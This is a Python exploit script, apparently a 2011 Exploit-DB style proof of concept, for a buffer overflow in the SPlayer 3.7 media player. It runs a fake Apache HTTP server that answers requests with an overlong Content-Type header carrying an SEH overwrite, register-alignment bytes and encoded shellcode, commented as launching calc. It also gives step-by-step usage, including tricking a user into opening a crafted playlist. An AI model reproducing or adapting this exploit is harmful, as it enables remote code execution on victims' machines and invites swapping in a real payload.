#!/usr/bin/python
# Exploit Title: SPlayer <= 3.7 (build 2055) Buffer Overflow Exploit
# Date: May 04, 2011
# Author: xsploitedsec <xsploitedsecurity [at] gmail [dot] com>
# Software Link: http://www.splayer.org/index.en.html
# Versions: <= 3.7 (build 2055)
# Tested On: WinXP SP3 Eng / SPlayer 3.7 build 2055 (English Locale)
# CVE: N/A

# Software Descripton:
# "SPlayer is a simple and free high performance all-in-one audio and video player that was designed
# in order to help you easily view your videos, images and listen to your music files. SPlayer lets
# you enjoy your favorite music and movies"

# Vulnerability information:
# SPlayer is vulnerable to a remote buffer overflow when parsing a specially crafted HTTP header from
# a remote server. The bug is triggered due to the "Content-Type:" field being passed to the wcstol() 
# function, prior to any bounds checking. This could allow an attacker to trick a remote user into 
# opening a specially crafted playlist file, containing a URL pointing to a malicious web server.

# Usage:

# Method 1:
# 1. Execute this script ...
# 2. Launch SPlayer, right click and click open->URL (ctrl+u) ...
# 3. Input the server URL and Click OK ...
# 4. Boom!/calc ...

# Method 2:
# 1. Execute this script ...
# 2. Launch SPlayer and click Open (ctrl+o) ...
# 3. Browse to any playlist file (m3u, pls) It must contain the server URL! ...
# 4. Click Open ...
# 5. [wait til URL is loaded], Boom!/calc ...

# URL Examples:
# http://serverip/anyfilename.avi
# http://serverip:port/anyfilename.avi
# http://serverip/*

# Shouts:
# edb-team, corelanc0d3r/corelan-team, kaotix, sheep, deca, nemesis

import sys
import socket

bindaddr = "0.0.0.0"
bindport = 1234
banner = "Apache/2.2.15 (Unix) mod_ssl/2.2.15 OpenSSL/0.9.8e-fips-rhel5 mod_auth_passthrough/2.1"

# calc shellcode / alpha_upper
calcshell = (			      # Plenty of room for lots of shellcode here
"PPYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAP"
"AZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB3Y9R8Z9L8Y2RJT1N0V0Y0I0I0I0I0"
"I0I0I0I0I0I0C0C0C0C0C0C070Q0Z1Z110X0P001100112K11110Q02110B020B0B000B0B110B0X0P0"
"8110B2U0J0I0I2L0M080N1Y0E0P0G2P0C000Q2P0K090K0U0E1Q0H0R0B0D0L0K0B2R0P000L0K0F020"
"F2L0L0K0C1R0G1T0N2K0Q1R0D1X0D0O0L2W0C2Z0E2V0E1Q0I2O0F0Q0K2P0L2L0E2L0Q2Q0C0L0E0R0"
"D2L0G0P0O010J2O0D0M0G2Q0K2W0I2R0H2P0P0R0C1W0N2K0B2R0B000L0K0P0B0G0L0G2Q0H0P0N2K0"
"C2P0Q1X0K050K2P0P2T0Q0Z0E0Q0H0P0B2P0N2K0C2X0F2X0L0K0B2X0E2P0E0Q0N030I2S0G0L0P0I0"
"N2K0G0D0N2K0F1Q0I0F0P010I2O0E1Q0O000L2L0J1Q0H0O0F2M0C010O070G0H0K0P0B0U0L040E0S0"
"C0M0K0H0E2K0Q2M0Q040P2U0K0R0P0X0N2K0F080G0T0C010I0C0E060N2K0F2L0B2K0N2K0B2X0G2L0"
"C010K1S0N2K0G2T0L0K0C010H0P0L0I0Q0T0D1T0E2T0C2K0C2K0P1Q0B2Y0P0Z0P0Q0I2O0K0P0C1X0"
"C2O0C1Z0N2K0F2R0H2K0L0F0C2M0B0J0E0Q0N2M0N1U0O0I0G2P0C000E0P0B2P0Q2X0P010N2K0P2O0"
"O2W0K0O0J2U0M2K0J0P0N0U0I020F060E080N0F0L0U0O0M0M0M0K0O0I0E0E2L0F1V0Q2L0F1Z0M0P0"
"K0K0M000Q1U0G2U0O0K0P0G0D0S0Q1R0P2O0P1Z0C000Q0C0K0O0J2U0E030C0Q0P2L0E030D2N0B0E0"
"D080Q2U0C000E0Z1111KPA")

class Client():

	def about(self):
		about = "\r=======================================================================\n"
		about +=  " PoC Title: Exploit Title: SPlayer <= 3.7 (build 2055) Buffer Overflow\n"
		about +=  " Author: xsploitedsec <xsploitedsecurity [at] gmail [dot] com>\r\n"
		about +=  "======================================================================="
		print about

	def run (self):
		pre = "HTTP/1.1 200 OK\r\n"
		pre += "Date: Tue, 03 May 2011 04:18:38 GMT\r\n"
		pre += "Server: " + banner + "\r\n"
		pre += "Last-Modified: Sun, 03 Jul 2005 18:39:44 GMT\r\n"
		pre += "ETag: ""1f3814d-e6800-3fb032cba1c00""\r\n"
		pre += "Accept-Ranges: bytes\r\n"
		pre += "Content-Length: 99999\r\n"
		pre += "Connection: close\r\n"
		pre += "Content-Type: "

		#Begin evil buffer
		evil = "\x41" * 2073
		evil += "\x61\x73"		#popad/nop align

		evil += "\x25\x73"		#SE handler - ppr/splayer.exe [0x00730025]

		#Close the blinds
		evil += "\x73"			#nop/align
		evil += "\x55"			#push ebp
		evil += "\x73"			#nop/align
		evil += "\x58"			#pop eax
		evil += "\x73"			#nop/align

		#Align to EAX/execute shellcode
		evil += "\x05\x19\x11"		#add eax, 0x11001900
		evil += "\x73"			#nop/align
		evil += "\x2d\x11\x11"		#sub eax, 0x11001100
		evil += "\x73"			#nop/align
		evil += "\x50"			#push eax
		evil += "\x73"			#nop/align
		evil += "\xc3"			#ret

		evil += "\x46" * 1004		#align shellcode->EAX
		#End evil buffer

		padding = "\x44" * (30000 - len(pre + evil + calcshell)) + "\r\n"
		payload = pre + evil + calcshell + padding

		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.bind((bindaddr, bindport))
			s.listen(5)
			print "[+] Listening for incoming connections on port: %d" % bindport + " ..."
		except:
			print "[!] Error binding socket, is the port already in use?\r\n[-] Exiting"
			sys.exit()

		# Note: SPlayer seems to connect/send a GET request twice every time a URL is processed
		# and it crashes after the second request

		while 1: 
			(clientsock, address) = s.accept()
			print "[*] New connection from", address[0]
			clientsock.recv(1024)
			sent = clientsock.send(payload)
			print "[+] Payload sent successfully [size: %d bytes]" % sent
			sent = 0
			print "[-] Closing connection to", address[0]
			clientsock.close()

if __name__ == "__main__":
	Client().about()
	Client().run()